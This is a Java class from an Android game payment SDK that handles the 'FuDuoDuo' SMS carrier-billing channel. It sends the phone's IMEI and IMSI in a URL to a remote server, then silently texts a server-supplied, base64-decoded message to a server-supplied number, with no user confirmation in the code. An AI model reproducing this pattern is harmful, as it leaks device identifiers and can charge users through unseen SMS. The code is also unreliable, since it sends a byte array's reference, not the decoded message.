package mobi.zty.pay.sdk.fuduoduo;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * 福多多 支付管理类
 * @author Administrator
 *
 */
public class FuDuoDuoInstance extends PaymentInterf{
	private static FuDuoDuoInstance instance;
	private Handler callBHandler = null;
	public static FuDuoDuoInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized FuDuoDuoInstance scyMMpay(){
		if(instance==null){
			instance =  new FuDuoDuoInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String orderid = (String) parameters[0];   //订单号
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		final String ppid = feeInfo.name;
		final String channelId = mkInfo.spChannel;
		final String imsi = Helper.getIMSI(context);  
		final String imei = Helper.getIMEI(context);  
		final String pay_url = mkInfo.payUrl1;//支付请求的url
		final String send_num = mkInfo.sendNum;
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					try {
						String url = pay_url+"?ppid="+ppid+"&imei="+imei+"&imsi="+imsi+"&cpparam="+channelId+orderid;
						String requestResponse = HttpRequestt.get(url).body();
						Util_G.debugE("requestResponse:", requestResponse);
						boolean isSendMsg = false;
						if (requestResponse!=null && requestResponse!="") {
							String[] arr = requestResponse.split("##");
							Util_G.debugE("status:", arr[0]);
							if (arr[0].equals("100"))  {//请求成功
								Helper.sendPayMessageToServer(PayConfig.FUDUODUO_PAY, "支付请求响应成功", feeIndex);
								byte[] msg = android.util.Base64.decode(arr[1], android.util.Base64.DEFAULT);
								Util_G.debugE("msg:", new String(msg));
								Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
								itSend.putExtra("fee_index", feeIndex);
						        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
						        Util_G.sendTextMessage(context, send_num, msg.toString(), mSendPI, 0);
								isSendMsg = true;
							}
						} 
						if (!isSendMsg) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "支付失败";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							return;
						}
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "支付失败";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();;
	}
	
}
